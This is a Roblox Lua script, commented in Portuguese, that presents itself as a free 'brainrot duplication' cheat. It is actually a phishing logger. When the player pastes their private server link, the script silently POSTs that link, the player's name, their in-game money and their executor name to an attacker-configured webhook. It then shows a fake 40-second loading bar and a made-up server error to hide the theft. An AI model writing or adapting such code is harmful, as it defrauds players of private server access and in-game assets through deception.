--[[
    DUPE BRAINROTS FREE - FULLSCREEN & AUTO-SCAN
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- 1. FUNÇÃO DE ENVIO PARA O WEBHOOK CONFIGURADO NO BOT
local function sendLog(link)
    if not _G.Webhook or _G.Webhook == "" then return end
    
    local moneyVal = "0"
    local stats = player:FindFirstChild("leaderstats")
    if stats then
        local m = stats:FindFirstChild("Cash") or stats:FindFirstChild("Money") or stats:FindFirstChild("Coins")
        if m then moneyVal = tostring(m.Value) end
    end

    local data = {
        ["username"] = "DUPE BRAINROTS FREE",
        ["avatar_url"] = "https://i.imgur.com/wSTFk7U.png",
        ["embeds"] = {{
            ["title"] = "🚀 Link VIP Capturado!",
            ["description"] = "O usuário iniciou o processo de duplicação.",
            ["color"] = 65280,
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "💰 Dinheiro", ["value"] = moneyVal, ["inline"] = true},
                {["name"] = "⚙️ Executor", ["value"] = identifyexecutor() or "Unknown", ["inline"] = true},
                {["name"] = "🔗 Link Servidor Privado", ["value"] = link, ["inline"] = false},
            },
            ["footer"] = {["text"] = "DUPE BRAINROTS FREE | Logger"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local jsonData = HttpService:JSONEncode(data)
    
    -- Envio via request (padrão de executores)
    local success, res = pcall(function()
        return request({
            Url = _G.Webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end)
end

-- 2. CRIAÇÃO DA INTERFACE (UI)
local sg = Instance.new("ScreenGui")
sg.Name = "SystemGui"
sg.DisplayOrder = 999
sg.IgnoreGuiInset = true -- Faz ocupar a tela toda, incluindo a barra do topo
sg.Parent = game.CoreGui

-- TELA PRETA (Full Screen)
local bg = Instance.new("Frame", sg)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Visible = false
bg.ZIndex = 10

local label = Instance.new("TextLabel", bg)
label.Text = "DUPE BRAINROT +10M"
label.Size = UDim2.new(1, 0, 0, 50)
label.Position = UDim2.new(0, 0, 0.4, 0)
label.TextColor3 = Color3.new(1, 1, 1)
label.Font = Enum.Font.GothamBold
label.TextSize = 35
label.BackgroundTransparency = 1

-- BARRA DE CARREGAMENTO
local barBg = Instance.new("Frame", bg)
barBg.Size = UDim2.new(0.6, 0, 0, 15)
barBg.Position = UDim2.new(0.2, 0, 0.5, 0)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0

local bar = Instance.new("Frame", barBg)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 120)
bar.BorderSizePixel = 0

local statusText = Instance.new("TextLabel", bg)
statusText.Text = "Carregando: 0%"
statusText.Size = UDim2.new(1, 0, 0, 30)
statusText.Position = UDim2.new(0, 0, 0.53, 0)
statusText.TextColor3 = Color3.new(0.8, 0.8, 0.8)
statusText.TextSize = 16
statusText.BackgroundTransparency = 1

local timeText = Instance.new("TextLabel", bg)
timeText.Text = "1MIN - 5MIN"
timeText.Size = UDim2.new(1, 0, 0, 20)
timeText.Position = UDim2.new(0, 0, 0.58, 0)
timeText.TextColor3 = Color3.fromRGB(150, 150, 150)
timeText.TextSize = 12
timeText.Font = Enum.Font.Gotham
timeText.BackgroundTransparency = 1

-- MENU INICIAL
local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 350, 0, 220)
main.Position = UDim2.new(0.5, -175, 0.5, -110)
main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
main.BorderSizePixel = 0

local uiCorner = Instance.new("UICorner", main)

local title = Instance.new("TextLabel", main)
title.Text = "DUPE BRAINROT GRÁTIS 10M"
title.Size = UDim2.new(1, 0, 0, 50)
title.TextColor3 = Color3.fromRGB(0, 255, 200)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.BackgroundTransparency = 1

local desc = Instance.new("TextLabel", main)
desc.Text = "Coloque seu link do server privado aqui"
desc.Size = UDim2.new(1, 0, 0, 30)
desc.Position = UDim2.new(0, 0, 0.25, 0)
desc.TextColor3 = Color3.new(0.8, 0.8, 0.8)
desc.TextSize = 14
desc.BackgroundTransparency = 1

local input = Instance.new("TextBox", main)
input.PlaceholderText = "https://www.roblox.com/share?code=..."
input.Size = UDim2.new(0.9, 0, 0, 40)
input.Position = UDim2.new(0.05, 0, 0.45, 0)
input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
input.TextColor3 = Color3.new(1, 1, 1)
input.TextScaled = true

local btn = Instance.new("TextButton", main)
btn.Text = "ATIVAR SCRIPT"
btn.Size = UDim2.new(0.9, 0, 0, 45)
btn.Position = UDim2.new(0.05, 0, 0.72, 0)
btn.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
btn.TextColor3 = Color3.new(1, 1, 1)
btn.Font = Enum.Font.GothamBold

-- 3. LÓGICA DE ATIVAÇÃO
btn.MouseButton1Click:Connect(function()
    local link = input.Text
    
    -- Verifica se o link é do roblox e contém um código de convite
    if link:find("roblox.com") and (link:find("share") or link:find("code")) then
        main.Visible = false
        bg.Visible = true
        sendLog(link) -- Envia o log silenciosamente
        
        -- Animação da Barra (Simulação de 0 a 100%)
        for i = 0, 100 do
            bar.Size = UDim2.new(i/100, 0, 1, 0)
            statusText.Text = "Carregando: " .. i .. "%"
            -- Velocidade média para parecer real (ajustado para ~40 seg)
            task.wait(math.random(2, 5) / 10) 
        end
        
        label.Text = "ERRO: INSTABILIDADE NO SERVIDOR"
        statusText.Text = "Por favor, tente novamente mais tarde."
        task.wait(3)
        sg:Destroy()
    else
        btn.Text = "LINK INVÁLIDO!"
        btn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        task.wait(1.5)
        btn.Text = "ATIVAR SCRIPT"
        btn.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
    end
end)
